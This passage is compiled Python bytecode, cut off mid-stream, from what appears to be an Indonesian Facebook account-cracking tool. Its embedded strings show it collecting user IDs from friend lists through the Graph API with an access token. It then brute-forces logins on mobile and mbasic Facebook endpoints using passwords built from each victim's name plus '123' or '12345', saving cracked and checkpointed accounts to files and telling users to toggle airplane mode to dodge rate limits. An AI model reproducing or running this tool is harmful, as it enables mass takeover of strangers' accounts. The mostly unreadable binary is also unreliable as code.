r|\n\x83\x01i\x01\xa1\x01\x01\x00t\x01d\x05|\x0c\x17\x00d\x13\x17\x00|\n\x17\x00d\x14\x17\x00t\rt\t|\x0b\x83\x01\x83\x01\x17\x00d\x15\x17\x00t\x0f\x17\x00\x83\x01\x01\x00qx|\t\xa0\x0et\r|\x08\x83\x01t\r|\n\x83\x01i\x01\xa1\x01\x01\x00t\x01d\x05t\r|\x08\x83\x01\x17\x00d\x13\x17\x00|\n\x17\x00d\x14\x17\x00t\rt\t|\x0b\x83\x01\x83\x01\x17\x00d\x15\x17\x00t\x0f\x17\x00\x83\x01\x01\x00qxd\t}\rt\x00\x83\x00\xa0\x01t\x02|\rd\x02d\x03\x8d\x02\xa1\x01\x01\x00t\x10t\x03d\x05\x17\x00t\x03\x17\x00d\x06\x17\x00t\x03\x17\x00d\x16\x17\x00\x83\x01}\x0ez\x06|\t|\x0e\x19\x00}\x0fW\x00n\x19\x04\x00t\x11\x90\x01y2\x01\x00\x01\x00\x01\x00d\x17}\x10t\x00\x83\x00\xa0\x01t\x02|\x10d\x02d\x03\x8d\x02\xa1\x01\x01\x00t\n\x83\x00\x01\x00Y\x00n\x01w\x00z\x1et\x0bd\x0e|\x0f\x17\x00d\x0f\x83\x02\xa0\x0c\xa1\x00}\x11|\x11D\x00]\x0c}\x12t\x12\xa0\x08|\x12\xa0\x13d\x18d\x19\xa1\x02\xa1\x01\x01\x00\x90\x01q?t\x14\x83\x00\x01\x00W\x00d\x00S\x00\x04\x00t\x15\x90\x01y\x99\x01\x00\x01\x00\x01\x00z\x1ft\x0bd\x10|\x0f\x17\x00d\x0f\x83\x02\xa0\x0c\xa1\x00}\x11|\x11D\x00]\x0c}\x12t\x12\xa0\x08|\x12\xa0\x13d\x18d\x19\xa1\x02\xa1\x01\x01\x00\x90\x01qet\x14\x83\x00\x01\x00W\x00Y\x00d\x00S\x00\x04\x00t\x15\x90\x01y\x98\x01\x00\x01\x00\x01\x00d\x1a}\x13t\x00\x83\x00\xa0\x01t\x02|\x13d\x02d\x03\x8d\x02\xa1\x01\x01\x00t\x04\xa0\x05d\x08\xa1\x01\x01\x00t\x16\x83\x00\x01\x00Y\x00Y\x00d\x00S\x00w\x00w\x00)\x1bNz\x14# CEK OPSI DARI FILErl\x00\x00\x00rm\x00\x00\x00z\x08on greenrp\x00\x00\x00rq\x00\x00\x00z*] Sedang Membaca File, Tunggu Sebentar ...r\x02\x00\x00\x00z\x1b# PILIH FILE YG AKAN DI CEKr\x85\x00\x00\x00r\x8d\x00\x00\x00r\x01\x00\x00\x00z(# ANDA BELUM MEMILIKI RESULT UNTUK DICEKr\x86\x00\x00\x00r;\x00\x00\x00r\x8e\x00\x00\x00r\x87\x00\x00\x00rx\x00\x00\x00r\x88\x00\x00\x00r\x89\x00\x00\x00r\x8a\x00\x00\x00r\x84\x00\x00\x00ry\x00\x00\x00\xda\x01\nr6\x00\x00\x00r\x8b\x00\x00\x00)\x17r\x7f\x00\x00\x00r\t\x00\x00\x00r\x80\x00\x00\x00r8\x00\x00\x00rg\x00\x00\x00rh\x00\x00\x00r3\x00\x00\x00r\x92\x00\x00\x00rE\x00\x00\x00r\x94\x00\x00\x00rQ\x00\x00\x00rB\x00\x00\x00r\x95\x00\x00\x00r\x96\x00\x00\x00r\x97\x00\x00\x00r\x98\x00\x00\x00ra\x00\x00\x00rL\x00\x00\x00r\xa5\x00\x00\x00\xda\x07replace\xda\x08cek_opsirR\x00\x00\x00r7\x00\x00\x00)\x14Z\x03tek\xda\x04teksZ\x08my_filesZ\x03lisZ\x02ktZ\x03merZ\x02tyZ\x02yyr\x9d\x00\x00\x00r\x9e\x00\x00\x00r\x9f\x00\x00\x00r\xa0\x00\x00\x00r\xa1\x00\x00\x00\xda\x05teks2r\xa2\x00\x00\x00r\xa3\x00\x00\x00r\x83\x00\x00\x00Z\x02hfZ\x02fzr\xa4\x00\x00\x00r5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00\xda\x04file,\x01\x00\x00s\x84\x00\x00\x00\x04\x01\x18\x01\x1c\x01\n\x01\x04\x01\x14\x01\x04\x01\x02\x01\n\x01\x08\x01\x0c\x01\x04\xff\x08\x02\x02\x01\n\x01\x08\x01\x0c\x01\x04\xff\x08\x02\x0c\x01\x04\x01\x14\x01\n\x01\x04\x02\x04\x01\x08\x01\x18\x01\x06\x01\x18\x01\x0c\x01\x02\xff\x08\x02\x08\x01\x0c\x01\x16\x01\x12\x01.\x01\x16\x022\x01\x04\x01\x14\x01\x1c\x01\x0e\x01\x0e\x01\x04\x01\x14\x01\n\x01\x02\xfd\x02\x04\x12\x01\x08\x01\x16\x01\x0c\x01\x0e\x01\x02\x01\x12\x01\x08\x01\x16\x01\x0e\x01\x0e\x01\x04\x01\x14\x01\n\x01\x0e\x01\x02\xfc\x02\xfar\xab\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00\t\x00\x00\x00C\x00\x00\x00s\xa8\x01\x00\x00z\tt\x00d\x01d\x02\x83\x02\xa0\x01\xa1\x00}\x00W\x00n\x0c\x04\x00t\x02y\x15\x01\x00\x01\x00\x01\x00t\x03\x83\x00\x01\x00Y\x00n\x01w\x00z\tt\x00d\x03d\x02\x83\x02\xa0\x01\xa1\x00}\x01W\x00n\x0c\x04\x00t\x02y+\x01\x00\x01\x00\x01\x00t\x03\x83\x00\x01\x00Y\x00n\x01w\x00t\x04t\x05d\x04\x17\x00t\x05\x17\x00d\x05\x17\x00t\x05\x17\x00d\x06\x17\x00\x83\x01\x01\x00t\x06t\x05d\x04\x17\x00t\x05\x17\x00d\x07\x17\x00t\x05\x17\x00d\x08\x17\x00\x83\x01}\x02t\x04d\tt\x05\x16\x00\x83\x01\x01\x00zJt\x07j\x08d\n|\x02\x17\x00d\x0b\x17\x00t\td\x0c\x19\x00\x17\x00d\r|\x01i\x01d\x0e\x8d\x02\xa0\n\xa1\x00}\x03|\x03d\x0f\x19\x00d\x10\x19\x00D\x00]\x16}\x04z\x0ft\x0b\xa0\x0c|\x04d\x11\x19\x00d\x12\x17\x00|\x04d\x13\x19\x00\x17\x00\xa1\x01\x01\x00W\x00qh\x01\x00\x01\x00\x01\x00Y\x00qht\x04t\x05d\x04\x17\x00t\x05\x17\x00d\x05\x17\x00t\x05\x17\x00d\x14\x17\x00t\rt\x0et\x0b\x83\x01\x83\x01\x17\x00\x83\x01\x01\x00t\x0f\x83\x00\x01\x00W\x00d\x00S\x00\x04\x00t\x07j\x10j\x11y\xb7\x01\x00\x01\x00\x01\x00d\x15}\x05t\x12|\x05d\x16d\x17\x8d\x02}\x06t\x13\x83\x00j\x04|\x06d\x16d\x17\x8d\x02\x01\x00t\x03\x83\x00\x01\x00Y\x00d\x00S\x00\x04\x00t\x14t\x02f\x02y\xd3\x01\x00\x01\x00\x01\x00d\x18}\x07t\x12|\x07d\x16d\x17\x8d\x02}\x08t\x13\x83\x00\xa0\x04|\x08\xa1\x01\x01\x00t\x03\x83\x00\x01\x00Y\x00d\x00S\x00w\x00)\x19Nr:\x00\x00\x00r;\x00\x00\x00r<\x00\x00\x00rp\x00\x00\x00rq\x00\x00\x00z\x12] CLONE PUBLIC IDSr\x90\x00\x00\x00z\r] INPUT ID : rs\x00\x00\x00\xfa https://graph.facebook.com/v2.0/\xfa)?fields=friends.limit(5000)&access_token=r\x01\x00\x00\x00r=\x00\x00\x00r>\x00\x00\x00\xda\x07friendsrj\x00\x00\x00rA\x00\x00\x00r\x8c\x00\x00\x00r@\x00\x00\x00z\n] Total : \xfa2# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGIrl\x00\x00\x00rm\x00\x00\x00z*# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK)\x15rB\x00\x00\x00rC\x00\x00\x00rR\x00\x00\x00rQ\x00\x00\x00r\t\x00\x00\x00r8\x00\x00\x00ra\x00\x00\x00rF\x00\x00\x00rG\x00\x00\x00rD\x00\x00\x00rH\x00\x00\x00rA\x00\x00\x00rE\x00\x00\x00r\x96\x00\x00\x00r\x94\x00\x00\x00\xda\x07settingrN\x00\x00\x00rO\x00\x00\x00r\x80\x00\x00\x00r\x7f\x00\x00\x00rL\x00\x00\x00)\trS\x00\x00\x00rT\x00\x00\x00Z\x03pilZ\x04koh2Z\x02pi\xda\x02li\xda\x02lor\xa9\x00\x00\x00r\xaa\x00\x00\x00r5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00r|\x00\x00\x00m\x01\x00\x00s>\x00\x00\x00\x02\x01\x12\x01\x0c\x01\n\x01\x02\xff\x02\x02\x12\x01\x0c\x01\n\x01\x02\xff\x1c\x02\x1c\x01\x0c\x01\x02\x01&\x01\x10\x01 \x01\n\x01(\x01\x0c\x01\x10\x01\x04\x01\x0c\x01\x10\x01\x0c\x01\x10\x01\x04\x01\x0c\x01\x0c\x01\x0c\x01\x02\xfcr|\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x17\x00\x00\x00\n\x00\x00\x00C\x00\x00\x00s\xd0\x02\x00\x00d\x01}\x00t\x00|\x00d\x02d\x03\x8d\x02}\x01t\x01t\x00|\x01d\x04d\x05\x8d\x02\x83\x01\x01\x00t\x02d\x06\x83\x01}\x02|\x02d\x07v\x00r<t\x02d\x08\x83\x01}\x03t\x03|\x03d\t\x83\x02\xa0\x04\xa1\x00\xa0\x05\xa1\x00}\x04d\n}\x05|\x04D\x00]\x11}\x06t\x06\xa0\x07|\x06\xa1\x01\x01\x00|\x05d\n7\x00}\x05|\x05d\x0bk\x02r:\x01\x00n\x01q)n\x92|\x02d\x0cv\x00r\xcet\x08t\td\r\x17\x00t\t\x17\x00d\x0e\x17\x00t\t\x17\x00d\x0f\x17\x00\x83\x01\x01\x00z\x12t\nt\x02t\td\r\x17\x00t\t\x17\x00d\x10\x17\x00t\t\x17\x00d\x11\x17\x00\x83\x01\x83\x01}\x07W\x00n\x1a\x04\x00t\x0byz\x01\x00\x01\x00\x01\x00d\x12}\x08t\x0c|\x08d\x02d\x03\x8d\x02}\tt\r\x83\x00\xa0\x08|\t\xa1\x01\x01\x00t\x0e\x83\x00\x01\x00Y\x00n\x01w\x00|\x07d\nk\x00s\x83|\x07d\x0bk\x04r\x94d\x13}\x08t\x0c|\x08d\x02d\x03\x8d\x02}\tt\r\x83\x00\xa0\x08|\t\xa1\x01\x01\x00t\x0e\x83\x00\x01\x00t\x0f\xa0\x10\xa1\x00}\nd\x14}\x0bt\x08t\td\r\x17\x00t\t\x17\x00d\x0e\x17\x00t\t\x17\x00d\x15\x17\x00\x83\x01\x01\x00t\x11|\x07\x83\x01D\x00]!}\x0c|\x0bd\n7\x00}\x0bt\x02t\td\r\x17\x00t\t\x17\x00t\x12|\x0b\x83\x01\x17\x00t\t\x17\x00d\x16\x17\x00t\x12|\x0b\x83\x01\x17\x00d\x17\x17\x00\x83\x01}\rt\x06\xa0\x07|\r\xa1\x01\x01\x00q\xacd\x18}\x0et\r\x83\x00\xa0\x08t\x0c|\x0ed\x02d\x03\x8d\x02\xa1\x01\x01\x00t\x0f\xa0\x10\xa1\x00}\nt\x06D\x00]b}\x0fz6|\n\xa0\x13d\x19|\x0f\x17\x00d\x1a\x17\x00t\x14d\x14\x19\x00\x17\x00\xa1\x01\xa0\x15\xa1\x00}\x10|\x10d\x1b\x19\x00d\x1c\x19\x00D\x00]\x1e}\x11z\x17|\x11d\x1d\x19\x00d\x1e\x17\x00|\x11d\x1f\x19\x00\x17\x00}\x12|\x12t\x16v\x00\x90\x01r\x0bn\x05t\x16\xa0\x07|\x12\xa1\x01\x01\x00W\x00q\xf8\x01\x00\x01\x00\x01\x00Y\x00q\xf8W\x00q\xe0\x04\x00t\x17t\x18f\x02\x90\x01y$\x01\x00\x01\x00\x01\x00Y\x00q\xe0\x04\x00t\x0fj\x19j\x1a\x90\x01yB\x01\x00\x01\x00\x01\x00d }\x13t\x0c|\x13d\x02d\x03\x8d\x02}\x14t\r\x83\x00j\x08|\x14d\x02d\x03\x8d\x02\x01\x00t\x0e\x83\x00\x01\x00Y\x00q\xe0w\x00d!t\x1bt\x16\x83\x01\x16\x00}\x15t\x1bt\x16\x83\x01d\x14k\x02\x90\x01rWt\x0c|\x15d\x02d\x03\x8d\x02}\x16n\x06t\x0c|\x15d\x02d\x03\x8d\x02}\x16t\r\x83\x00\xa0\x08|\x16\xa1\x01\x01\x00t\x1c\x83\x00\x01\x00d\x00S\x00)"NzL[bold green][01] CLONE MULTIPLE FILE\n[02] CLONE MANUAL MULTIPLE[/bold green]rl\x00\x00\x00rm\x00\x00\x00Z\x04MENUrn\x00\x00\x00u\x0c\x00\x00\x00[\xe2\x9e\xa3] MENU: rt\x00\x00\x00u\x12\x00\x00\x00[\xe2\x9e\xa3] FILE NAME : r;\x00\x00\x00r\x02\x00\x00\x00\xe9\x14\x00\x00\x00ru\x00\x00\x00rp\x00\x00\x00u\x03\x00\x00\x00\xe2\x9e\xa3z\x16] TOTAL LIMIT IDS [20]r\x90\x00\x00\x00z\x0e] BERAPA ID : z\x16# YOU ENTERED WRONG IDz\x12# OUT OF RANGE MENr\x01\x00\x00\x00z\'] DO YOU WANT TO CLONE FROM FRIEND LISTz\x0b] ENTER ID z\x03 : z!# Tunggu Sedang Mengumpulkan ID  r\xac\x00\x00\x00r\xad\x00\x00\x00r\xae\x00\x00\x00rj\x00\x00\x00rA\x00\x00\x00r\x8c\x00\x00\x00r@\x00\x00\x00r\xaf\x00\x00\x00z\x1d# BERHASIL MENGUMPULKAN %s ID)\x1drz\x00\x00\x00r{\x00\x00\x00ra\x00\x00\x00rB\x00\x00\x00rC\x00\x00\x00r\x99\x00\x00\x00\xda\x03uidrE\x00\x00\x00r\t\x00\x00\x00r8\x00\x00\x00\xda\x03int\xda\nValueErrorr\x80\x00\x00\x00r\x7f\x00\x00\x00rQ\x00\x00\x00rF\x00\x00\x00\xda\x07Sessionr\x9a\x00\x00\x00r\x96\x00\x00\x00rG\x00\x00\x00rD\x00\x00\x00rH\x00\x00\x00rA\x00\x00\x00rL\x00\x00\x00rR\x00\x00\x00rN\x00\x00\x00rO\x00\x00\x00r\x94\x00\x00\x00r\xb0\x00\x00\x00)\x17Z\x03masZ\x04mas2Z\x05pilihZ\x05nmfilZ\x06nmfile\xda\x02noZ\x04xfilZ\x03jumZ\x05pesanZ\x06pesan2\xda\x03sesZ\x02yz\xda\x03metZ\x02klZ\x03sedZ\x05userr\xda\x03col\xda\x02miZ\x03isor\xb1\x00\x00\x00r\xb2\x00\x00\x00Z\x03totZ\x04tot2r5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00r}\x00\x00\x00\x8c\x01\x00\x00s\x82\x00\x00\x00\x04\x01\x0c\x01\x10\x01\x08\x01\x08\x01\x08\x01\x12\x01\x04\x01\x08\x01\n\x01\x08\x01\x08\x01\x04\x01\x02\xff\x02\x80\x08\x02\x1c\x01\x02\x01$\x01\x0c\x01\x04\x01\x0c\x01\x0c\x01\n\x01\x02\xfc\x10\x05\x04\x01\x0c\x01\x0c\x01\x06\x01\x08\x01\x04\x01\x1c\x01\x0c\x01\x08\x01,\x01\x0c\x01\x04\x01\x14\x01\x08\x01\x08\x01\x02\x01\x1e\x01\x10\x01\x02\x01\x14\x01\x0c\x01\n\x01\x04\x80\n\x01\x04\xfb\x12\x06\x04\x01\x12\x01\x04\x01\x0c\x01\x10\x01\n\x01\x02\xfc\x0c\x05\x0e\x01\x0e\x01\x0c\x02\x0c\x01\n\x01r}\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sR\x02\x00\x00d\x01}\x00t\x00\x83\x00\xa0\x01t\x02|\x00d\x02d\x03\x8d\x02\xa1\x01\x01\x00d\x04}\x01t\x03|\x01d\x02d\x03\x8d\x02}\x02t\x04t\x03|\x02d\x05d\x06\x8d\x02\x83\x01\x01\x00t\x05t\x06d\x07\x17\x00t\x06\x17\x00d\x08\x17\x00t\x06\x17\x00d\t\x17\x00\x83\x01}\x03|\x03d\nv\x00r;t\x07t\x08\x83\x01D\x00]\x07}\x04t\t\xa0\n|\x04\xa1\x01\x01\x00q2nT|\x03d\x0bv\x00rhg\x00}\x05t\x07t\x08\x83\x01D\x00]\x07}\x06|\x05\xa0\n|\x06\xa1\x01\x01\x00qEt\x0b|\x05\x83\x01}\x07|\x07d\x0c\x18\x00}\x08t\x0c|\x07\x83\x01D\x00]\r}\tt\t\xa0\n|\x05|\x08\x19\x00\xa1\x01\x01\x00|\x08d\x0c8\x00}\x08qYn\'|\x03d\rv\x00r\x80t\x08D\x00]\x10}\x06t\r\xa0\x0ed\x0et\x0bt\t\x83\x01\xa1\x02}\nt\t\xa0\x0f|\n|\x06\xa1\x02\x01\x00qnn\x0fd\x0f}\x0bt\x00\x83\x00\xa0\x01t\x02|\x0bd\x02d\x03\x8d\x02\xa1\x01\x01\x00t\x10\x83\x00\x01\x00d\x01}\x0ct\x00\x83\x00\xa0\x01t\x02|\x0cd\x02d\x03\x8d\x02\xa1\x01\x01\x00d\x10}\rt\x03|\rd\x02d\x03\x8d\x02}\x0et\x04t\x03|\x0ed\x11d\x06\x8d\x02\x83\x01\x01\x00t\x05t\x06d\x07\x17\x00t\x06\x17\x00d\x12\x17\x00t\x06\x17\x00d\x13\x17\x00\x83\x01}\x0f|\x0fd\nv\x00r\xc3t\x11\xa0\nd\x14\xa1\x01\x01\x00n\x19|\x0fd\x0bv\x00r\xcdt\x11\xa0\nd\x15\xa1\x01\x01\x00n\x0f|\x0fd\rv\x00r\xd7t\x11\xa0\nd\x16\xa1\x01\x01\x00n\x05t\x11\xa0\nd\x14\xa1\x01\x01\x00d\x17}\x10t\x00\x83\x00\xa0\x01t\x02|\x10d\x02d\x03\x8d\x02\xa1\x01\x01\x00t\x05t\x06d\x07\x17\x00t\x06\x17\x00d\x08\x17\x00t\x06\x17\x00d\x18\x17\x00\x83\x01}\x11|\x11d\x19v\x00\x90\x01r\x01t\x12\xa0\nd\x1a\xa1\x01\x01\x00n\x05t\x12\xa0\nd\x1b\xa1\x01\x01\x00t\x05t\x06d\x07\x17\x00t\x06\x17\x00d\x08\x17\x00t\x06\x17\x00d\x1c\x17\x00\x83\x01}\x12|\x12d\x19v\x00\x90\x01r\x1ft\x13\xa0\nd\x1a\xa1\x01\x01\x00n\x05t\x13\xa0\nd\x1b\xa1\x01\x01\x00t\x14\x83\x00\x01\x00d\x00S\x00)\x1dNz\t# METHOD rl\x00\x00\x00rm\x00\x00\x00zV[bold green][01] CLONE OLD ID\n[02] CLONE NEW ID\n[03] CLONE FROM RANDOM ID[/bold green]z\x05MENU rn\x00\x00\x00rp\x00\x00\x00rq\x00\x00\x00z\x0b] METHOD : rt\x00\x00\x00ru\x00\x00\x00r\x02\x00\x00\x00rv\x00\x00\x00r\x01\x00\x00\x00ry\x00\x00\x00zM[bold green][01]M-FACEBOOK\n[02]FREE-FACEBOOK\n[03]MBASIC-FACEBOOK[/bold green]u\n\x00\x00\x00METHOD \xe2\x9c\x93r\x90\x00\x00\x00rr\x00\x00\x00\xda\x06mobile\xda\x04freeZ\x06mbasicz\x1f# SHOW OPTIONS PLEASE TYPE (T) z!]SHOW LINKED APK PLEASE TYPE (T) \xa9\x02\xda\x01y\xda\x01Y\xda\x02yar\xb8\x00\x00\x00z"]SHOW C/P OPTIONS PLEASE TYPE (T) )\x15r\x7f\x00\x00\x00r\t\x00\x00\x00r\x80\x00\x00\x00rz\x00\x00\x00r{\x00\x00\x00ra\x00\x00\x00r8\x00\x00\x00\xda\x06sortedrA\x00\x00\x00\xda\x03id2rE\x00\x00\x00r\x94\x00\x00\x00r\x9a\x00\x00\x00\xda\x06randomZ\x07randint\xda\x06insertrQ\x00\x00\x00\xda\x06method\xda\ttaplikasi\xda\x05oprek\xda\x07passwrd)\x13Z\x02wlr\xa9\x00\x00\x00Z\x03tak\xda\x02huZ\x03tuaZ\x04mudaZ\x05bacotZ\x03bcmZ\x04bcmiZ\x04xmudZ\x02xxr\x83\x00\x00\x00r\xba\x00\x00\x00Z\x03iozZ\x04gessZ\x02hcZ\x03guwZ\x05aplikZ\x03oskr5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00r\xb0\x00\x00\x00\xcc\x01\x00\x00sh\x00\x00\x00\x04\x01\x14\x01\x04\x01\x0c\x01\x10\x01\x1c\x01\x08\x01\x0c\x01\x0c\x01\x02\xff\x08\x03\x04\x01\x0c\x01\x0c\x01\x08\x01\x08\x01\x0c\x01\x0e\x01\n\x01\x02\xfe\x08\x03\x08\x01\x10\x01\x0e\x01\x02\xfe\x04\x04\x14\x01\x06\x01\x04\x01\x14\x01\x04\x01\x0c\x01\x10\x01\x1c\x01\x08\x01\x0c\x01\x08\x01\x0c\x01\x08\x01\x0c\x01\n\x02\x04\x01\x14\x01\x1c\x01\n\x01\x0c\x01\n\x02\x1c\x01\n\x01\x0c\x01\n\x02\n\x01r\xb0\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x08\x00\x00\x00C\x00\x00\x00s\xc2\x01\x00\x00d\x01}\x00t\x00\x83\x00\xa0\x01t\x02|\x00d\x02d\x03\x8d\x02\xa1\x01\x01\x00d\x04t\x03t\x04f\x02\x16\x00}\x01t\x05t\x06|\x01d\x05d\x06\x8d\x02\x83\x01\x01\x00t\x07d\x07d\x08\x8d\x01\x8f\x8e}\x02t\x08D\x00]\x83}\x03|\x03\xa0\td\t\xa1\x01d\n\x19\x00|\x03\xa0\td\t\xa1\x01d\x0b\x19\x00\xa0\n\xa1\x00\x02\x02}\x04}\x05|\x05\xa0\td\x0c\xa1\x01d\n\x19\x00}\x06d\rg\x01}\x07t\x0b|\x05\x83\x01d\x0ek\x00r[t\x0b|\x06\x83\x01d\x0fk\x00rLn.|\x07\xa0\x0c|\x06d\x10\x17\x00\xa1\x01\x01\x00|\x07\xa0\x0c|\x06d\x11\x17\x00\xa1\x01\x01\x00n\x1ft\x0b|\x06\x83\x01d\x0fk\x00rg|\x07\xa0\x0c|\x05\xa1\x01\x01\x00n\x13|\x07\xa0\x0c|\x05\xa1\x01\x01\x00|\x07\xa0\x0c|\x06d\x10\x17\x00\xa1\x01\x01\x00|\x07\xa0\x0c|\x06d\x11\x17\x00\xa1\x01\x01\x00d\x12t\rv\x00r\x86|\x02\xa0\x0et\x0f|\x04|\x07\xa1\x03\x01\x00q"d\x13t\rv\x00r\x92|\x02\xa0\x0et\x10|\x04|\x07\xa1\x03\x01\x00q"d\x14t\rv\x00r\x9e|\x02\xa0\x0et\x11|\x04|\x07\xa1\x03\x01\x00q"|\x02\xa0\x0et\x0f|\x04|\x07\xa1\x03\x01\x00q"W\x00d\x00\x04\x00\x04\x00\x83\x03\x01\x00n\x081\x00s\xb0w\x01\x01\x00\x01\x00\x01\x00Y\x00\x01\x00t\x01d\x15\x83\x01\x01\x00d\x16}\x08t\x00\x83\x00\xa0\x01t\x02|\x08d\x02d\x03\x8d\x02\xa1\x01\x01\x00t\x12t\x13d\x17\x17\x00t\x13\x17\x00d\x18\x17\x00t\x13\x17\x00d\x19\x17\x00\x83\x01}\t|\td\x1av\x00r\xdct\x14\x83\x00\x01\x00d\x00S\x00t\x15\x83\x00\x01\x00d\x00S\x00)\x1bNz\x13# BRUTE HAS STARTEDrl\x00\x00\x00rm\x00\x00\x00zWOK ID STORE TO : OK/%s\nCP ID SAVED TO : CP/%s\nTURN ON AIRPLANE MODE FOR EVERY 8 SECONDSZ\x05CLONErn\x00\x00\x00\xe9\x1e\x00\x00\x00)\x01Z\x0bmax_workersr\x8c\x00\x00\x00r\x01\x00\x00\x00r\x02\x00\x00\x00\xfa\x01 Z\x071234567\xe9\x06\x00\x00\x00\xe9\x03\x00\x00\x00Z\x03123Z\x0512345r\xbd\x00\x00\x00r\xbe\x00\x00\x00Z\x05touchr6\x00\x00\x00z\x17# CHECK RESULTS OPTIONSrp\x00\x00\x00r\x90\x00\x00\x00z$]SHOW CLONE RESULTS PLEASE TYPE (T) r\xbf\x00\x00\x00)\x16r\x7f\x00\x00\x00r\t\x00\x00\x00r\x80\x00\x00\x00\xda\x03okc\xda\x03cpcr{\x00\x00\x00rz\x00\x00\x00\xda\x04tredr\xc4\x00\x00\x00r\x9b\x00\x00\x00\xda\x05lowerr\x94\x00\x00\x00rE\x00\x00\x00r\xc7\x00\x00\x00\xda\x06submit\xda\x05crack\xda\tcrackfreeZ\ncracktouchra\x00\x00\x00r8\x00\x00\x00r\xa8\x00\x00\x00rQ\x00\x00\x00)\nZ\x03lerZ\x04krekZ\x04poolZ\x06yuzong\xda\x03idfZ\x03nmfZ\x03frs\xda\x03pwvZ\x05tanyaZ\x03woir5\x00\x00\x00r5\x00\x00\x00r6\x00\x00\x00r\xca\x00\x00\x00\x05\x02\x00\x00sF\x00\x00\x00\x04\x01\x14\x01\x0c\x01\x10\x01\x0c\x01\x08\x01"\x01\x0e\x01\x06\x01\x0c\x01\x0c\x01\x02\x01\x0e\x02\x10\x01\x0c\x02\x0c\x01\n\x02\x0e\x01\x0e\x01\x08\x01\x10\x01\x08\x01\x10\x01\x08\x01\x10\x01\x10\x02\x02\xe8\x1c\xff\x08\x1a\x04\x01\x14\x01\x1c\x01\x08\x01\n\x01\n\x02r\xca\x00\x00\x00c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x13\x00\x00\x00C\x00\x00\x00sV\x04\x00\x00t\x00\xa0\x01t\x02g\x01\xa1\x01}\x02t\x03d\x01\x14\x00t\x04t\x05\x83\x01\x1b\x00}\x03d\x02}\x04t\x06d\x03|\x02t\x03t\x04t\x05\x83\x01t\x07t\x08t\t|\x03\x83\x01t\n|\x04\x83\x01t\x0bf\x08\x16\x00d\x04d\x05\x8d\x02\x01\x00t\x0cj\r\xa0\x0e\xa1\x00\x01\x00t\x00\xa0\x01t\x0f\xa1\x01}\x05t\x00\xa0\x01t\x10\xa1\x01}\x06t\x00\xa0\x01t\x11\xa1\x01}\x07t\x12\xa0\x13\xa1\x00}\x08|\x01D\x00\x90\x01]\xe3}\t\x90\x01z\xcf|\x08j\x14\xa0\x15d\x06d\x07|\x06d\x08d\x07d\td\nd\x0bd\x0cd\rd\x0ed\x0fd\x10d\x11\x9c\r\xa1\x01\x01\x00|\x08\xa0\x16d\x12|\x00\x17\x00d\x13\x17\x00\xa1\x01j\x17}\nt\x18\xa0\x19d\x14t\n|\n\x83\x01\xa1\x02\xa0\x1ad\x15\xa1\x01t\x18\xa0\x19d\x16t\n|\n\x83\x01\xa1\x02\xa0\x1ad\x15\xa1\x01|\x00d\x17|\td\x18d\x19\x9c\x06}\x0b|\x08j\x14\xa0\x15d\x06d\x1ad\x07d\x1bd\x1c|\x05d\x08d\td\nd\x0bd\x0cd\rd\x1d|\x00\x17\x00d\x13\x17\x00d\x0fd\x10d\x1e\x9c\x0f\xa1\x01\x01\x00|\x08j\x1bd\x1f|\x0bd d!\x8d\x03}\x0cd"|\x0cj\x1c\xa0\x1d\xa1\x00\xa0\x1e\xa1\x00v\x00r\xecd#t\x1fv\x00r\xbct \xa0!|\x00d$\x17\x00|\t\x17\x00\xa1\x01\x01\x00t"|\x00|\t\x83\x02\x01\x00n,t\x06d%t#\x9b\x00d&|\x00\x9b\x00d\'|\t\x9b\x00t$\x9b\x00\x9d\x07\x83\x01\x01\x00t%d(t&\x17\x00d)\x83\x02\xa0\'|\x00d$\x17\x00|\t\x17\x00d*\x17\x00\xa1\x01\x01\x00t \xa0!|\x00d$\x17\x00|\t\x17\x00\xa1\x01\x01\x00t\x08d\x157\x00a\x08W\x00\x01\x00\x90\x01n9d+|\x08j\x1c\xa0\x1d\xa1\x00\xa0\x1e\xa1\x00v\x00\x90\x02r\x10d,d-i\x01}\rd.t(v\x00\x90\x01rDt\x07d\x157\x00a\x07|\x0cj\x1c\xa0\x1d\xa1\x00}\x0ed/\xa0)d0d1\x84\x00|\x08j\x1c\xa0\x1d\xa1\x00\xa0*\xa1\x00D\x00\x83\x01\xa1\x01}\x0ft\x06d%t+\x9b\x00d2|\x00\x9b\x00d\'|\t\x9b\x00d$|\x0f\x9b\x00t$\x9b\x00\x9d\t\x83\x01\x01\x00t%d3t,\x17\x00d)\x83\x02\xa0\'|\x00d$\x17\x00|\t\x17\x00d$\x17\x00|\x0f\x17\x00d$\x17\x00|\x05\x17\x00d*\x17\x00\xa1\x01\x01\x00W\x00\x01\x00n\xe1d#t(v\x00\x90\x02r\x0ft\x07d\x157\x00a\x07|\x0cj\x1c\xa0\x1d\xa1\x00}\x0ed/\xa0)d4d1\x84\x00|\x08j\x1c\xa0\x1d\xa1\x00\xa0*\xa1\x00D\x00\x83\x01\xa1\x01}\x0ft%d3t,\x17\x00d)\x83\x02\xa0\'|\x00d$\x17\x00|\t\x17\x00d$\x17\x00|\x0f\x17\x00d$\x17\x00|\x05\x17\x00d*\x17\x00\xa1\x01\x01\x00|\x00}\x10d5}\x11t\x12\xa0\x13\xa1\x00}\x12|\x12j\x16d6|\x0e|\rd7\x8d\x03j\x17}\x13|\x12j\x16d8|\x0e|\rd7\x8d\x03j\x17}\x14|\x11d97\x00}\x11t\x18\xa0-d:t\n|\x14\x83\x01\xa1\x02}\x15d;\\\x02}\x16}\x17t\x18\xa0-d<t\n|\x13\x83\x01\xa1\x02}\x18|\x15D\x00]\x17}\x19|\x16d\x157\x00}\x16|\x11d=|\x16\x9b\x00d>|\x19\x9b\x00d\x04|\x18|\x17\x19\x00\x9b\x00d?\x9d\x077\x00}\x11\x90\x01q\x